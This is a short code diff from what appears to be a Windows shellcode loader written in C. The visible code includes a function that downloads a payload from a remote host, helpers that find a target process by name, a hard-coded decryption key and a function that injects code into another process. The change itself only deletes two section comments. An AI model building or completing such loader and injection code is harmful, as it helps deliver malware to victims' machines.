@@ -124,7 +124,6 @@ BOOL Download(LPCWSTR host, INTERNET_PORT port, Xcode* xcode) {
     return 1;
 }
 
-// ------ Finding a target process ------ //
 
 DWORD GetFirstPIDProclist(const WCHAR** aszProclist, DWORD dwSize);
 DWORD GetFirstPIDProcname(const WCHAR* szProcname);
@@ -174,8 +173,6 @@ DWORD GetFirstPIDProcname(const WCHAR* szProcname) {
 
 unsigned char key[] = { 0x4d, 0x72, 0x7a, 0x66, 0x55, 0x63, 0x6b, 0x57, 0x45, 0x46, 0x32, 0x31, 0x77, 0x65, 0x66, 0x78 };
 
-
-// ------ Injecting into process ------ //
 
 BOOL Inject(DWORD dwPID, Xcode xcode) {
 
